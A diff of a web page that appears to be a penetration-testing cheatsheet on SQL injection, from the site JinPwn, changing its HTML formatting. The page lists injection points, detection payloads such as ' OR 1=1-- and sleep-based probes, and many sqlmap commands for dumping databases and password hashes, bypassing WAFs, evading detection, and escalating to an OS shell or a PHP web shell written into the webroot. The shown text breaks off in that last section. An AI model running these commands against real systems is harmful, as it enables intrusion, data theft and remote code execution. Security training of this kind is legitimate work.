@@ -1,634 +1,152 @@
-<!DOCTYPE html>
-<html lang="en-US" dir="ltr" class="">
-<head>
-  <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>SQL Injection | JinPwn</title><meta name="description" content="Find injection points, confirm, extract, escalate to RCE.">
-<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
-<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
-
-<link rel="canonical" href="https://jinpwn.dev/cheatsheets/web/web03-sql-injection/">
-<meta property="og:title" content="SQL Injection | JinPwn">
-<meta property="og:description" content="Find injection points, confirm, extract, escalate to RCE.">
-<meta property="og:type" content="website">
-<meta property="og:url" content="https://jinpwn.dev/cheatsheets/web/web03-sql-injection/">
-<meta property="og:site_name" content="JinPwn">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="SQL Injection | JinPwn">
-<meta name="twitter:description" content="Find injection points, confirm, extract, escalate to RCE.">
-<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
-<meta name="twitter:site" content="@jinpwn">
-<meta name="twitter:creator" content="@jinpwn">
-
-
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"Find injection points, confirm, extract, escalate to RCE.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"SQL Injection | JinPwn","url":"https://jinpwn.dev/cheatsheets/web/web03-sql-injection/"}</script>
-
-<meta name="theme-color" content="#111111">
-<link rel="icon" type="image/png" href="/favicon.png">
-
-      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
-
-
-        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
-        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
-
-
-</head>
-<body class="">
-  
-
-
-
-
-
-  
-  
-  
-
-
-
-  
-
-<header class="site-header">
-  <nav class="top-nav">
-    <div class="container nav-inner">
-      <div class="nav-left">
-        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
-        <div class="nav-links desktop-only">
-          
-    <a href="/">Posts</a>
-    <a href="/posts/">Archive</a>
-    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
-    <a href="/about/">About</a>
-
-        </div>
-      </div>
-      <div class="nav-actions">
-        <div class="search-anchor" id="search-root" data-search-root>
-          <label class="search-trigger" for="search-input">
-            <span class="search-glyph" aria-hidden="true">
-              <svg viewBox="0 0 24 24">
-                <circle cx="11" cy="11" r="7"></circle>
-                <path d="M20 20L16.65 16.65"></path>
-              </svg>
-            </span>
-            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
-            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
-              <svg viewBox="0 0 24 24" aria-hidden="true">
-                <path d="M18 6L6 18"></path>
-                <path d="M6 6l12 12"></path>
-              </svg>
-            </button>
-            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
-          </label>
-          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
-  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
-  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
-    <p class="search-empty">Type to search posts and cheatsheets.</p>
-  </div>
-</div>
-
-        </div>
-        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
-          <svg viewBox="0 0 24 24" aria-hidden="true">
-            <circle cx="11" cy="11" r="7"></circle>
-            <path d="M20 20L16.65 16.65"></path>
-          </svg>
-        </button>
-        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
-          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
-            <path d="M3 6h18"></path>
-            <path d="M3 12h18"></path>
-            <path d="M3 18h18"></path>
-          </svg>
-          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
-            <path d="M18 6L6 18"></path>
-            <path d="M6 6l12 12"></path>
-          </svg>
-        </button>
-      </div>
-    </div>
-    <div id="mobile-nav" class="mobile-nav">
-      
-    <a href="/">Posts</a>
-    <a href="/posts/">Archive</a>
-    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
-    <a href="/about/">About</a>
-
-    </div>
-  </nav>
-</header>
-
-  
-  <main class="site-main">
-    
-  
-  
-  
-  <article class="container cheatsheet-docs-shell">
-    <div class="cheatsheet-docs-layout">
-      
-        <aside class="cheatsheet-sidebar" aria-label="Web Pentesting navigation">
-    <div class="cheatsheet-sidebar-inner">
-      
-        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
-      
-      <a href="/cheatsheets/web/" class="cheatsheet-sidebar-section">Web Pentesting</a>
-      
-        <nav class="cheatsheet-sidebar-nav">
-          <ul class="cheatsheet-sidebar-list">
-            
-              <li>
-                <a href="/cheatsheets/web/00-web-moc/" class="cheatsheet-sidebar-link">Web MOC</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web01-content-discovery/" class="cheatsheet-sidebar-link">Content Discovery</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web02-auth--session/" class="cheatsheet-sidebar-link">Auth &amp; Session</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web03-sql-injection/" class="cheatsheet-sidebar-link is-current">SQL Injection</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web04-nosql-injection/" class="cheatsheet-sidebar-link">NoSQL Injection</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web05-command-injection/" class="cheatsheet-sidebar-link">Command Injection</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web06-ssti/" class="cheatsheet-sidebar-link">SSTI</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web08-xss/" class="cheatsheet-sidebar-link">XSS</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web07-xxe/" class="cheatsheet-sidebar-link">XXE</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web09-csrf--cors/" class="cheatsheet-sidebar-link">WEB09 CSRF &amp; CORS</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web10-request-smuggling/" class="cheatsheet-sidebar-link">Request Smuggling</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web11-web-cache-poisoning/" class="cheatsheet-sidebar-link">Web Cache Poisoning</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web12-ssrf/" class="cheatsheet-sidebar-link">SSRF</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web13-file-upload--lfi/" class="cheatsheet-sidebar-link">File Upload &amp; LFI</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web14-deserialization/" class="cheatsheet-sidebar-link">Deserialization</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web15-prototype-pollution/" class="cheatsheet-sidebar-link">WEB15 Prototype Pollution</a>
-              </li>
-            
-          </ul>
-        </nav>
-      
-    </div>
-  </aside>
-      
-      <div class="cheatsheet-docs-main cheatsheet-page-main">
-        <header class="cheatsheet-page-header">
-          <h1>SQL Injection</h1>
-          
-        </header>
-
-        
-          <details class="cheatsheet-mobile-sections">
-    <summary class="cheatsheet-mobile-sections-summary">
-      <span class="cheatsheet-mobile-sections-label">Sections</span>
-      <span class="cheatsheet-mobile-sections-current">SQL Injection</span>
-      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
-    </summary>
-    <div class="cheatsheet-mobile-sections-panel">
-      <nav aria-label="Web Pentesting sections">
-        <ul class="cheatsheet-mobile-sections-list">
-          
-            <li>
-              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
-            </li>
-          
-          <li>
-            <a href="/cheatsheets/web/" class="cheatsheet-mobile-sections-link">Overview</a>
-          </li>
-          
-            <li>
-              <a href="/cheatsheets/web/00-web-moc/" class="cheatsheet-mobile-sections-link">Web MOC</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web01-content-discovery/" class="cheatsheet-mobile-sections-link">Content Discovery</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web02-auth--session/" class="cheatsheet-mobile-sections-link">Auth &amp; Session</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web03-sql-injection/" class="cheatsheet-mobile-sections-link is-current">SQL Injection</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web04-nosql-injection/" class="cheatsheet-mobile-sections-link">NoSQL Injection</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web05-command-injection/" class="cheatsheet-mobile-sections-link">Command Injection</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web06-ssti/" class="cheatsheet-mobile-sections-link">SSTI</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web08-xss/" class="cheatsheet-mobile-sections-link">XSS</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web07-xxe/" class="cheatsheet-mobile-sections-link">XXE</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web09-csrf--cors/" class="cheatsheet-mobile-sections-link">WEB09 CSRF &amp; CORS</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web10-request-smuggling/" class="cheatsheet-mobile-sections-link">Request Smuggling</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web11-web-cache-poisoning/" class="cheatsheet-mobile-sections-link">Web Cache Poisoning</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web12-ssrf/" class="cheatsheet-mobile-sections-link">SSRF</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web13-file-upload--lfi/" class="cheatsheet-mobile-sections-link">File Upload &amp; LFI</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web14-deserialization/" class="cheatsheet-mobile-sections-link">Deserialization</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web15-prototype-pollution/" class="cheatsheet-mobile-sections-link">WEB15 Prototype Pollution</a>
-            </li>
-          
-        </ul>
-      </nav>
-    </div>
-  </details>
-        
-
-        <div class="markdown-content cheatsheet-page-body">
-          <p>Find injection points, confirm, extract, escalate to RCE.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">T</span><span class="o">=</span>https://target.com
-</span></span></code></pre></div><h2 id="i-where-it-lives" data-heading-permalink="true"><span class="heading-content">i. Where it lives</span>
-    <a class="heading-permalink" href="#i-where-it-lives" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Anywhere user input ends up in a SQL query:</p>
-<ul>
-<li>URL parameters (<code>?id=1</code>, <code>?search=x</code>)</li>
-<li>POST body fields</li>
-<li>JSON keys and values</li>
-<li>HTTP headers (User-Agent, Referer, X-Forwarded-For occasionally logged into DB)</li>
-<li>Cookies</li>
-<li>Anywhere you see numeric IDs, sort/order params, filter fields</li>
-<li>Search forms (especially with LIKE clauses)</li>
-<li>Login forms (auth bypass via <code>' OR 1=1--</code>)</li>
-<li>Second-order points (data stored then later used in another query unsafely)</li>
-</ul>
-<h2 id="ii-quick-detection" data-heading-permalink="true"><span class="heading-content">ii. Quick detection</span>
-    <a class="heading-permalink" href="#ii-quick-detection" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Test these on every parameter, even ones that look &ldquo;non-injectable&rdquo;:</p>
-<pre tabindex="0"><code>&#39;             → 500 / SQL error in body
+<!doctype html><html lang=en-US dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>SQL Injection | JinPwn</title><meta name=description content="Find injection points, confirm, extract, escalate to RCE."><meta name=robots content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1"><meta name=googlebot content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1"><link rel=canonical href=https://jinpwn.dev/cheatsheets/web/web03-sql-injection/><meta property="og:title" content="SQL Injection | JinPwn"><meta property="og:description" content="Find injection points, confirm, extract, escalate to RCE."><meta property="og:type" content="website"><meta property="og:url" content="https://jinpwn.dev/cheatsheets/web/web03-sql-injection/"><meta property="og:site_name" content="JinPwn"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://jinpwn.dev/images/og/og.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="SQL Injection | JinPwn"><meta name=twitter:description content="Find injection points, confirm, extract, escalate to RCE."><meta name=twitter:image content="https://jinpwn.dev/images/og/og.png"><meta name=twitter:site content="@jinpwn"><meta name=twitter:creator content="@jinpwn"><script type=application/ld+json>{"@context":"https://schema.org","@type":"WebPage","description":"Find injection points, confirm, extract, escalate to RCE.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"SQL Injection | JinPwn","url":"https://jinpwn.dev/cheatsheets/web/web03-sql-injection/"}</script><meta name=theme-color content="#111111"><link rel=icon type=image/png href=/favicon.png><link rel=stylesheet href=/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin=anonymous><script src=/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin=anonymous defer></script><script src=/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin=anonymous defer></script></head><body><header class=site-header><nav class=top-nav><div class="container nav-inner"><div class=nav-left><a href=/ class="brand-link has-logo" aria-label=Home><img src=/favicon.png alt=jinpwn.dev class=brand-logo style=--brand-logo-height:36px></a><div class="nav-links desktop-only"><a href=/>Posts</a>
+<a href=/posts/>Archive</a>
+<a href=/cheatsheets/ class=is-current>Cheatsheets</a>
+<a href=/about/>About</a></div></div><div class=nav-actions><div class=search-anchor id=search-root data-search-root><label class=search-trigger for=search-input><span class=search-glyph aria-hidden=true><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.35-3.35"/></svg>
+</span><input id=search-input type=search placeholder=Search... autocomplete=off spellcheck=false aria-label="Search posts and cheatsheets">
+<button type=button class=search-clear data-search-clear aria-label="Clear search" hidden>
+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg>
+</button>
+<span class="search-trigger-shortcut desktop-only" aria-hidden=true>CTRL K</span></label><div id=search-dropdown class=search-dropdown hidden data-search-index-url=/search-index.json data-search-runtime-url=/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js><p class=search-status data-search-status aria-live=polite>Type to search posts and cheatsheets.</p><div class=search-results data-search-results role=listbox aria-label="Search results"><p class=search-empty>Type to search posts and cheatsheets.</p></div></div></div><button class="icon-button mobile-only" type=button data-search-mobile-toggle aria-label=Search aria-expanded=false aria-controls=search-root>
+<svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.35-3.35"/></svg>
+</button>
+<button class="icon-button mobile-only" type=button data-mobile-toggle aria-label="Toggle menu" aria-expanded=false aria-controls=mobile-nav>
+<svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon=""><path d="M3 6h18"/><path d="M3 12h18"/><path d="M3 18h18"/></svg>
+<svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon="" hidden=""><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div></div><div id=mobile-nav class=mobile-nav><a href=/>Posts</a>
+<a href=/posts/>Archive</a>
+<a href=/cheatsheets/ class=is-current>Cheatsheets</a>
+<a href=/about/>About</a></div></nav></header><main class=site-main><article class="container cheatsheet-docs-shell"><div class=cheatsheet-docs-layout><aside class=cheatsheet-sidebar aria-label="Web Pentesting navigation"><div class=cheatsheet-sidebar-inner><a href=/cheatsheets/ class=cheatsheet-sidebar-root>All cheatsheets</a>
+<a href=/cheatsheets/web/ class=cheatsheet-sidebar-section>Web Pentesting</a><nav class=cheatsheet-sidebar-nav><ul class=cheatsheet-sidebar-list><li><a href=/cheatsheets/web/00-web-moc/ class=cheatsheet-sidebar-link>Web MOC</a></li><li><a href=/cheatsheets/web/web01-content-discovery/ class=cheatsheet-sidebar-link>Content Discovery</a></li><li><a href=/cheatsheets/web/web02-auth--session/ class=cheatsheet-sidebar-link>Auth & Session</a></li><li><a href=/cheatsheets/web/web03-sql-injection/ class="cheatsheet-sidebar-link is-current">SQL Injection</a></li><li><a href=/cheatsheets/web/web04-nosql-injection/ class=cheatsheet-sidebar-link>NoSQL Injection</a></li><li><a href=/cheatsheets/web/web05-command-injection/ class=cheatsheet-sidebar-link>Command Injection</a></li><li><a href=/cheatsheets/web/web06-ssti/ class=cheatsheet-sidebar-link>SSTI</a></li><li><a href=/cheatsheets/web/web08-xss/ class=cheatsheet-sidebar-link>XSS</a></li><li><a href=/cheatsheets/web/web07-xxe/ class=cheatsheet-sidebar-link>XXE</a></li><li><a href=/cheatsheets/web/web09-csrf--cors/ class=cheatsheet-sidebar-link>WEB09 CSRF & CORS</a></li><li><a href=/cheatsheets/web/web10-request-smuggling/ class=cheatsheet-sidebar-link>Request Smuggling</a></li><li><a href=/cheatsheets/web/web11-web-cache-poisoning/ class=cheatsheet-sidebar-link>Web Cache Poisoning</a></li><li><a href=/cheatsheets/web/web12-ssrf/ class=cheatsheet-sidebar-link>SSRF</a></li><li><a href=/cheatsheets/web/web13-file-upload--lfi/ class=cheatsheet-sidebar-link>File Upload & LFI</a></li><li><a href=/cheatsheets/web/web14-deserialization/ class=cheatsheet-sidebar-link>Deserialization</a></li><li><a href=/cheatsheets/web/web15-prototype-pollution/ class=cheatsheet-sidebar-link>WEB15 Prototype Pollution</a></li></ul></nav></div></aside><div class="cheatsheet-docs-main cheatsheet-page-main"><header class=cheatsheet-page-header><h1>SQL Injection</h1></header><details class=cheatsheet-mobile-sections><summary class=cheatsheet-mobile-sections-summary><span class=cheatsheet-mobile-sections-label>Sections</span>
+<span class=cheatsheet-mobile-sections-current>SQL Injection</span>
+<span class=cheatsheet-mobile-sections-caret aria-hidden=true></span></summary><div class=cheatsheet-mobile-sections-panel><nav aria-label="Web Pentesting sections"><ul class=cheatsheet-mobile-sections-list><li><a href=/cheatsheets/ class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a></li><li><a href=/cheatsheets/web/ class=cheatsheet-mobile-sections-link>Overview</a></li><li><a href=/cheatsheets/web/00-web-moc/ class=cheatsheet-mobile-sections-link>Web MOC</a></li><li><a href=/cheatsheets/web/web01-content-discovery/ class=cheatsheet-mobile-sections-link>Content Discovery</a></li><li><a href=/cheatsheets/web/web02-auth--session/ class=cheatsheet-mobile-sections-link>Auth & Session</a></li><li><a href=/cheatsheets/web/web03-sql-injection/ class="cheatsheet-mobile-sections-link is-current">SQL Injection</a></li><li><a href=/cheatsheets/web/web04-nosql-injection/ class=cheatsheet-mobile-sections-link>NoSQL Injection</a></li><li><a href=/cheatsheets/web/web05-command-injection/ class=cheatsheet-mobile-sections-link>Command Injection</a></li><li><a href=/cheatsheets/web/web06-ssti/ class=cheatsheet-mobile-sections-link>SSTI</a></li><li><a href=/cheatsheets/web/web08-xss/ class=cheatsheet-mobile-sections-link>XSS</a></li><li><a href=/cheatsheets/web/web07-xxe/ class=cheatsheet-mobile-sections-link>XXE</a></li><li><a href=/cheatsheets/web/web09-csrf--cors/ class=cheatsheet-mobile-sections-link>WEB09 CSRF & CORS</a></li><li><a href=/cheatsheets/web/web10-request-smuggling/ class=cheatsheet-mobile-sections-link>Request Smuggling</a></li><li><a href=/cheatsheets/web/web11-web-cache-poisoning/ class=cheatsheet-mobile-sections-link>Web Cache Poisoning</a></li><li><a href=/cheatsheets/web/web12-ssrf/ class=cheatsheet-mobile-sections-link>SSRF</a></li><li><a href=/cheatsheets/web/web13-file-upload--lfi/ class=cheatsheet-mobile-sections-link>File Upload & LFI</a></li><li><a href=/cheatsheets/web/web14-deserialization/ class=cheatsheet-mobile-sections-link>Deserialization</a></li><li><a href=/cheatsheets/web/web15-prototype-pollution/ class=cheatsheet-mobile-sections-link>WEB15 Prototype Pollution</a></li></ul></nav></div></details><div class="markdown-content cheatsheet-page-body"><p>Find injection points, confirm, extract, escalate to RCE.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>T</span><span class=o>=</span>https://target.com
+</span></span></code></pre></div><h2 id=i-where-it-lives data-heading-permalink=true><span class=heading-content>i. Where it lives</span>
+<a class=heading-permalink href=#i-where-it-lives aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Anywhere user input ends up in a SQL query:</p><ul><li>URL parameters (<code>?id=1</code>, <code>?search=x</code>)</li><li>POST body fields</li><li>JSON keys and values</li><li>HTTP headers (User-Agent, Referer, X-Forwarded-For occasionally logged into DB)</li><li>Cookies</li><li>Anywhere you see numeric IDs, sort/order params, filter fields</li><li>Search forms (especially with LIKE clauses)</li><li>Login forms (auth bypass via <code>' OR 1=1--</code>)</li><li>Second-order points (data stored then later used in another query unsafely)</li></ul><h2 id=ii-quick-detection data-heading-permalink=true><span class=heading-content>ii. Quick detection</span>
+<a class=heading-permalink href=#ii-quick-detection aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Test these on every parameter, even ones that look &ldquo;non-injectable&rdquo;:</p><pre tabindex=0><code>&#39;             → 500 / SQL error in body
 &#34;             → similar
 \             → escape attempts may leak  
 1&#39; OR &#39;1&#39;=&#39;1
 1 AND 1=1
 1 AND 1=2     → different response from 1=1 = blind boolean injection
 1&#39; AND sleep(5)--    → 5 second delay = time-based blind
-</code></pre><p>Burp Scanner (passive + active audit) catches obvious cases. For mass-fuzz across many endpoints:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sqlmap -m urls.txt --batch --random-agent --level<span class="o">=</span><span class="m">2</span> --risk<span class="o">=</span><span class="m">1</span>
-</span></span></code></pre></div><h2 id="iii-sqlmap-the-workhorse" data-heading-permalink="true"><span class="heading-content">iii. sqlmap, the workhorse</span>
-    <a class="heading-permalink" href="#iii-sqlmap-the-workhorse" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Default and most common patterns:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Single URL with GET parameter:</span>
-</span></span><span class="line"><span class="cl">sqlmap -u <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/product?id=1&#34;</span> --batch
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">## POST request body:</span>
-</span></span><span class="line"><span class="cl">sqlmap -u <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/login&#34;</span> --data <span class="s1">&#39;user=admin&amp;pass=x&#39;</span> --batch
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">## JSON body:</span>
-</span></span><span class="line"><span class="cl">sqlmap -u <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/api/search&#34;</span> --data <span class="s1">&#39;{&#34;q&#34;:&#34;test&#34;}&#39;</span> --headers<span class="o">=</span><span class="s1">&#39;Content-Type: application/json&#39;</span> --batch
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">## With cookie / session:</span>
-</span></span><span class="line"><span class="cl">sqlmap -u <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/profile?id=1&#34;</span> --cookie <span class="s1">&#39;PHPSESSID=abc; auth=xyz&#39;</span> --batch
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">## Header injection:</span>
-</span></span><span class="line"><span class="cl">sqlmap -u <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/&#34;</span> --headers<span class="o">=</span><span class="s1">&#39;X-Forwarded-For: 1*&#39;</span> --batch
-</span></span><span class="line"><span class="cl"><span class="c1">## (* marks the injection point)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">## Test all parameters (level=5 risk=3 = maximum, slow):</span>
-</span></span><span class="line"><span class="cl">sqlmap -u <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/api?id=1&amp;sort=name&#34;</span> --batch --level<span class="o">=</span><span class="m">5</span> --risk<span class="o">=</span><span class="m">3</span>
-</span></span></code></pre></div><p>Save the request from Burp and feed it:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## In Burp: right-click request -&gt; Copy to file -&gt; request.txt</span>
-</span></span><span class="line"><span class="cl">sqlmap -r request.txt --batch
-</span></span><span class="line"><span class="cl">sqlmap -r request.txt --batch --level<span class="o">=</span><span class="m">5</span> --risk<span class="o">=</span><span class="m">3</span>
-</span></span></code></pre></div><p>Useful flags:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">--current-db                <span class="c1">## what DB are we in</span>
-</span></span><span class="line"><span class="cl">--current-user
-</span></span><span class="line"><span class="cl">--users                     <span class="c1">## DB user list</span>
-</span></span><span class="line"><span class="cl">--passwords                 <span class="c1">## DB user hashes</span>
-</span></span><span class="line"><span class="cl">--privileges
-</span></span><span class="line"><span class="cl">--dbs                       <span class="c1">## list databases</span>
-</span></span><span class="line"><span class="cl">-D somedb --tables
-</span></span><span class="line"><span class="cl">-D somedb -T users --columns
-</span></span><span class="line"><span class="cl">-D somedb -T users --dump
-</span></span><span class="line"><span class="cl">--dump-all --exclude-sysdbs
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">--technique<span class="o">=</span>BEUSTQ          <span class="c1">## B=boolean, E=error, U=union, S=stacked, T=time, Q=inline</span>
-</span></span><span class="line"><span class="cl">--dbms<span class="o">=</span>mysql                <span class="c1">## skip DBMS detection if known</span>
-</span></span><span class="line"><span class="cl">--threads<span class="o">=</span><span class="m">10</span>                <span class="c1">## parallel requests</span>
-</span></span><span class="line"><span class="cl">--prefix<span class="o">=</span><span class="s1">&#39;&#34; AND&#39;</span> --suffix<span class="o">=</span><span class="s1">&#39;-- -&#39;</span>   <span class="c1">## manual context override</span>
-</span></span><span class="line"><span class="cl">--tamper<span class="o">=</span>space2comment,charunicodeencode    <span class="c1">## WAF bypass tampers</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">--proxy<span class="o">=</span>http://127.0.0.1:8080
-</span></span><span class="line"><span class="cl">--random-agent
-</span></span><span class="line"><span class="cl">--delay<span class="o">=</span><span class="m">2</span> --timeout<span class="o">=</span><span class="m">15</span>      <span class="c1">## slow it down to avoid detection / rate limits</span>
-</span></span></code></pre></div><p>When sqlmap finds an injection but can&rsquo;t dump:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sqlmap -r req.txt --technique<span class="o">=</span>T --time-sec<span class="o">=</span><span class="m">3</span> --threads<span class="o">=</span><span class="m">1</span>     <span class="c1">## time-based often slower but works</span>
-</span></span><span class="line"><span class="cl">sqlmap -r req.txt --string<span class="o">=</span><span class="s2">&#34;welcome&#34;</span>     <span class="c1">## tell sqlmap what a successful response looks like</span>
-</span></span><span class="line"><span class="cl">sqlmap -r req.txt --not-string<span class="o">=</span><span class="s2">&#34;error&#34;</span>
-</span></span></code></pre></div><h2 id="iv-sqlmap-to-rce" data-heading-permalink="true"><span class="heading-content">iv. sqlmap to RCE</span>
-    <a class="heading-permalink" href="#iv-sqlmap-to-rce" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>When you have admin-level DB access, sqlmap automates the foothold:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## OS shell (uses DBMS-specific tricks):</span>
-</span></span><span class="line"><span class="cl">sqlmap -r req.txt --os-shell
-</span></span><span class="line"><span class="cl"><span class="c1">## File write (PHP web shell into webroot):</span>
-</span></span><span class="line"><span class="cl">sqlmap -r req.txt --file-write<span class="o">=</span>/tmp/sh.php --file-dest<span class="o">=</span>/var/www/html/sh.php
